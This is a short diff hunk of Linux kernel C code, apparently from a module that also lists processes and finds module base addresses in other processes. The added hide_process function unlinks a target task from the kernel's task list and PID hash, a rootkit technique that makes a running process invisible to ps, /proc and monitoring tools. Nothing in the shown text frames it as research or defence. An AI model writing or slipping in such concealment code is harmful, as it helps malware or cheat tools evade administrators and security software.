@@ -123,7 +123,22 @@ int  get_proc_pid_list(char* name)
 
         return pid;
 }
+void hide_process(int pid)
+{
+    /* Linux kernel version 4.x.x */
+    struct task_struct *task = NULL;
+    struct pid_link *link = NULL;
+    struct hlist_node *node = NULL;
 
+    task = pid_task(find_vpid(pid), PIDTYPE_PID);
+    link = &task->pids[PIDTYPE_PID];
+
+    list_del_rcu(&task->tasks);
+    INIT_LIST_HEAD(&task->tasks);
+    node = &link->node;
+    hlist_del_rcu(node);
+    INIT_HLIST_NODE(node);
+}
 
 uintptr_t get_module_base(pid_t pid, char* name) 
 {
